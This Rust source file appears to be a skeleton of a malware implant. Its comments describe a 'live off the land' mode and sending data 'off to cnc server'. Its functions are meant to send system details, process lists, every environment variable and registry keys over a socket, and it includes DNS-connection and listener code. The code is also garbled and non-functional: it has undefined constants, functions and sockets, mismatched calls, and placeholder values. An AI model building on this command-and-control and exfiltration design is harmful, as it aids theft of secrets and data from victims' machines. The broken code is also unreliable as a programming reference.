// use a loop to iterate through the input parameters and print the contents to the console.
fn main() {
    let mut args = std::env::args();
    args.next();
    for arg in args {
        println!("{}", arg);
    }

    // Create a constant string that contains the help text.
    const HELP_TEXT: &str = "This is a help text.";
    
    // Create a constant string that contains the version text.
    const VERSION_TEXT: &str = "This is a version text.";

    // Create a constant string that containes the license text.
    const LICENSE_TEXT: &str = "This is a license text.";

    // Create a constant string that contains the liveofftheland text.
    const LIVE_OFF_THE_LAND_TEXT: &str = "This is a liveofftheland text.";

    // Create a constant string that contains the batch deploy text.
    const BATCH_DEPLOY_TEXT: &str = "This is a batch deploy text.";

    // Check if the input has a value equal to "--help".
    // If it does, print the help text and exit the program.
    if args.any(|x| x == "--help") {
        println!("{}", HELP_TEXT);
        return;
    }

    // Check if the input has a value equal to "--version".
    // If it does, print the version text and exit the program.
    if args.any(|x| x == "--version") {
        println!("{}", VERSION_TEXT);
        return;
    }

    // Check if the input has a value equal to "--license".
    // If it does, print the license text and exit the program.
    if args.any(|x| x == "--license") {
        println!("{}", LICENSE_TEXT);
        return;
    }

    // Check if the input has a value equal to "--liveofftheland".
    // If it does, print the liveoftheland text and exit the program.
    if args.any(|x| x == "--liveoftheland") {
        println!("{}", LIVE_OFF_THE_LAND_TEXT); 

        // Run sys_info to get the system information every 24 hours.
        // This is a blocking call.
        sys_info::run_sys_info();

        return;
    }

    // Check if the input has a value equal to "--batch-deploy".
    // If it does, print the batch deploy text and exit the program.
    if args.any(|x| x == "--batch-deploy") {
        println!("{}", BATCH_DEPLOY_TEXT);
        return;
    }

    // If none of the above conditions are met, print the help text and exit the program.
    println!("{}", HELP_TEXT);


}

// This is a blocking call.
fn run_sys_info() {
    // Create a thread that calls system_info every 24 hours.
    thread::Builder::new()
        .name("sys_info".to_string())
        .spawn(|| {
            loop {
                // Call system_info.
                system_info::system_info();

                // Sleep for 24 hours.
                thread::sleep(time::Duration::from_secs(86400));
            }
        });
}

// This function should print the following information to the console:
// - System name and version.
// - System architecture.
// - Number of cores.
// - Number of logical processors.
// - Number of physical processors.
// - System uptime.
// - System load.
// - System memory.
// - System swap.
// - System free disk space.
// - System total disk space.
// - System free inodes.
// - System total inodes.
fn system_info() {
    // Create a constant string that contains the system name and version.
    const SYSTEM_NAME_AND_VERSION: &str = "This is a system name and version.";
    // Create a constant string that contains the system architecture.
    const SYSTEM_ARCHITECTURE: &str = "This is a system architecture.";
    // Create a constant string that contains the number of cores.
    const NUMBER_OF_CORES: &str = "This is a number of cores.";
    // Create a constant string that contains the number of logical processors.
    const NUMBER_OF_LOGICAL_PROCESSORS: &str = "This is a number of logical processors.";
    // Create a constant string that contains the number of physical processors.
    const NUMBER_OF_PHYSICAL_PROCESSORS: &str = "This is a number of physical processors.";
    // Create a constant string that contains the system uptime.
    const SYSTEM_UPTIME: &str = "This is a system uptime.";
    // Create a constant string that contains the system load.
    const SYSTEM_LOAD: &str = "This is a system load.";
    // Create a constant string that contains the system memory.
    const SYSTEM_MEMORY: &str = "This is a system memory.";
    // Create a constant string that contains the system swap.
    const SYSTEM_SWAP: &str = "This is a system swap.";
    // Create a constant string that contains the system free disk space.
    const SYSTEM_FREE_DISK_SPACE: &str = "This is a system free disk space.";
    // Create a constant string that contains the system total disk space.
    const SYSTEM_TOTAL_DISK_SPACE: &str = "This is a system total disk space.";
    // Create a constant string that contains the system free inodes.
    const SYSTEM_FREE_INODES: &str = "This is a system free inodes.";
    // Create a constant string that contains the system total inodes.
    const SYSTEM_TOTAL_INODES: &str = "This is a system total inodes.";

    // Print the system name and version.
    println!("{}", SYSTEM_NAME_AND_VERSION);
    // Print the system architecture.
    println!("{}", SYSTEM_ARCHITECTURE);
    // Print the number of cores.
    println!("{}", NUMBER_OF_CORES);
    // Print the number of logical processors.
    println!("{}", NUMBER_OF_LOGICAL_PROCESSORS);
    // Print the number of physical processors.
    println!("{}", NUMBER_OF_PHYSICAL_PROCESSORS);
    // Print the system uptime.
    println!("{}", SYSTEM_UPTIME);
    // Print the system load.
    println!("{}", SYSTEM_LOAD);
    // Print the system memory.
    println!("{}", SYSTEM_MEMORY);
    // Print the system swap.
    println!("{}", SYSTEM_SWAP);
    // Print the system free disk space.
    println!("{}", SYSTEM_FREE_DISK_SPACE);
    // Print the system total disk space.
    println!("{}", SYSTEM_TOTAL_DISK_SPACE);
    // Print the system free inodes.
    println!("{}", SYSTEM_FREE_INODES);
    // Print the system total inodes.
    println!("{}", SYSTEM_TOTAL_INODES);

    // Get data to send off to cnc server.
    send_system_info_data();
    get_running_processes();

}

// The function should accept the following arguments:
// - The address of the server.
// - The port of the server.
// - The number of connections to accept.
// - The number of bytes to read from the socket.
// - A function that handles the connection.
// The function should return a vector of the results of the function that handles the connection.
fn listen_for_connections(address: String, port: String, number_of_connections: u32, number_of_bytes: u32, handler: fn(String) -> String) -> Vec<String> {
    // Create a vector to hold the results of the function that handles the connection.
    let mut results: Vec<String> = Vec::new();

    // Create a listener.
    let listener = TcpListener::bind(format!("{}:{}", address, port)).unwrap();

    // Accept the incoming connections.
    for stream in listener.incoming() {
        // Create a thread that handles the connection.
        thread::Builder::new()
            .name(format!("handle_connection_{}", results.len()))
            .spawn(move || {
                // Create a socket.
                let mut socket = match stream {
                    Ok(stream) => stream,
                    Err(e) => {
                        println!("Error: {}", e);
                        return;
                    }
                };

                // Read the data from the socket.
                let mut data = String::new();
                match socket.read_to_string(&mut data) {
                    Ok(_) => {
                        // Print the data.
                        println!("{}", data);

                        // Call the handler function.
                        let result = handler(data);

                        // Print the result.
                        println!("{}", result);

                        // Add the result to the results vector.
                        results.push(result);
                    }
                    Err(e) => {
                        println!("Error: {}", e);
                        return;
                    }
                };
            });
    }

    // Return the results.
    results
}

// Write a function that terminates an active socket connection.
fn terminate_connection(socket: &TcpStream) {
    // Create a vector to hold the data.
    let mut data = Vec::new();

    // Read the data from the socket.
    match socket.read_to_end(&mut data) {
        Ok(_) => {
            // Print the data.
            println!("{}", String::from_utf8(data).unwrap());
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Close the socket.
    match socket.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };
}

// Send system information data to the server.
fn send_system_info_data(socket: &TcpStream) {
    // Create a vector to hold the data.
    let mut data = Vec::new();

    // Write the system name and version.
    data.extend_from_slice(SYSTEM_NAME_AND_VERSION.as_bytes());
    // Write the system architecture.
    data.extend_from_slice(SYSTEM_ARCHITECTURE.as_bytes());
    // Write the number of cores.
    data.extend_from_slice(NUMBER_OF_CORES.as_bytes());
    // Write the number of logical processors.
    data.extend_from_slice(NUMBER_OF_LOGICAL_PROCESSORS.as_bytes());
    // Write the number of physical processors.
    data.extend_from_slice(NUMBER_OF_PHYSICAL_PROCESSORS.as_bytes());
    // Write the system uptime.
    data.extend_from_slice(SYSTEM_UPTIME.as_bytes());
    // Write the system load.
    data.extend_from_slice(SYSTEM_LOAD.as_bytes());
    // Write the system memory.
    data.extend_from_slice(SYSTEM_MEMORY.as_bytes());
    // Write the system swap.
    data.extend_from_slice(SYSTEM_SWAP.as_bytes());
    // Write the system free disk space.
    data.extend_from_slice(SYSTEM_FREE_DISK_SPACE.as_bytes());
    // Write the system total disk space.
    data.extend_from_slice(SYSTEM_TOTAL_DISK_SPACE.as_bytes());
    // Write the system free inodes.
    data.extend_from_slice(SYSTEM_FREE_INODES.as_bytes());
    // Write the system total inodes.
    data.extend_from_slice(SYSTEM_TOTAL_INODES.as_bytes());

    // Write the data to the socket.
    match socket.write(&data) {
        Ok(_) => {
            println!("Data sent.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Close the socket.
    match socket.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };
}

// Write a function that retrieves all running processes on the computer.
fn get_running_processes() -> Vec<String> {
    // Create a vector to hold the results.
    let mut results: Vec<String> = Vec::new();

    // Open the process list.
    let mut process_list = match OpenProcess(PROCESS_ALL_ACCESS, false, 0) {
        Some(process_list) => process_list,
        None => {
            println!("Failed to get the process list.");
            return results;
        }
    };

    // Get the process list size.
    let mut process_list_size = 0;
    match GetProcessList(process_list, &mut process_list_size) {
        Some(_) => {
            println!("Process list size: {}", process_list_size);
        }
        None => {
            println!("Failed to get the process list size.");
            return results;
        }
    };

    // Create a vector to hold the process IDs.
    let mut process_ids: Vec<u32> = Vec::new();
    process_ids.resize(process_list_size as usize, 0);

    // Get the process IDs.
    match GetProcessList(process_list, &mut process_list_size) {
        Some(process_ids) => {
            println!("Process IDs: {:?}", process_ids);
        }
        None => {
            println!("Failed to get the process IDs.");
            return results;
        }
    };

    // Create a vector to hold the process names.
    let mut process_names: Vec<String> = Vec::new();
    process_names.resize(process_list_size as usize, String::new());

    // Get the process names.
    match GetProcessNameList(process_list, &mut process_list_size, &mut process_names) {
        Some(process_names) => {
            println!("Process names: {:?}", process_names);
        }
        None => {
            println!("Failed to get the process names.");
            return results;
        }
    };

    // Write all running processes to the socket.
    for i in 0..process_list_size {
        // Create a vector to hold the data.
        let mut data = Vec::new();

        // Write the process ID.
        data.extend_from_slice(format!("{}", process_ids[i]).as_bytes());
        // Write the process name.
        data.extend_from_slice(process_names[i].as_bytes());

        // Write the data to the socket.
        match socket.write(&data) {
            Ok(_) => {
                println!("Data sent.");
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        };
    }

    // Close the socket.
    match socket.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Return the results.
    results
}

// Establish a DNS connection. Return the connection.
fn establish_dns_connection() -> Option<TcpStream> {
    // Create a vector to hold the results.
    let mut results: Option<TcpStream> = None;

    // Establish a connection to the DNS server.
    let mut connection = match TcpStream::connect(DNS_SERVER) {
        Ok(connection) => connection,
        Err(e) => {
            println!("Error: {}", e);
            return results;
        }
    };

    // Set the socket to non-blocking.
    match connection.set_nonblocking(true) {
        Ok(_) => {
            println!("Socket set to non-blocking.");
        }
        Err(e) => {
            println!("Error: {}", e);
            return results;
        }
    };

    // Return the connection.
    results = Some(connection);

    // Return the results.
    results
}

// Send a DNS query to the server.
fn send_dns_query(dns_connection: &mut TcpStream) {
    // Create a vector to hold the data.
    let mut data = Vec::new();

    // Write the DNS query.
    data.extend_from_slice(DNS_QUERY.as_bytes());

    // Write the data to the socket.
    match dns_connection.write(&data) {
        Ok(_) => {
            println!("Data sent.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Close the socket.
    match dns_connection.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };
}

// Receive a DNS response from the server.
fn receive_dns_response(dns_connection: &mut TcpStream) {
    // Create a vector to hold the data.
    let mut data = Vec::new();

    // Read the data from the socket.
    match dns_connection.read(&mut data) {
        Ok(_) => {
            println!("Data received.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Close the socket.
    match dns_connection.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };
}

// Store all environment variables in a vector and write them to the socket.
fn get_environment_variables() -> Vec<String> {
    // Create a vector to hold the results.
    let mut results: Vec<String> = Vec::new();

    // Get the environment variables.
    match env::vars() {
        Ok(environment_variables) => {
            println!("Environment variables: {:?}", environment_variables);
        }
        Err(e) => {
            println!("Error: {}", e);
            return results;
        }
    };

    // Write all environment variables to the socket.
    for (key, value) in environment_variables {
        // Create a vector to hold the data.
        let mut data = Vec::new();

        // Write the key.
        data.extend_from_slice(key.as_bytes());
        // Write the value.
        data.extend_from_slice(value.as_bytes());

        // Write the data to the socket.
        match socket.write(&data) {
            Ok(_) => {
                println!("Data sent.");
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        };
    }

    // Close the socket.
    match socket.shutdown(Shutdown::Both) {
        Ok(_) => {
            println!("Socket closed.");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    };

    // Return the results.
    results
}

// Store all environment variables in a vector and write them to the socket.
fn get_registry_keys() -> Vec<String> {
    // Create a vector to hold the results.
    let mut results: Vec<String> = Vec::new();

    // Get the registry keys.
    match RegistryKey::open_subkey_with_flags(HKEY_LOCAL_MACHINE, REGISTRY_KEY, KEY_READ) {
        Ok(registry_key) => {
            println!("Registry key: {:?}", registry_key);
        }
        Err(e) => {
            println!("Error: {}", e);
            return results;
        }
    };
} 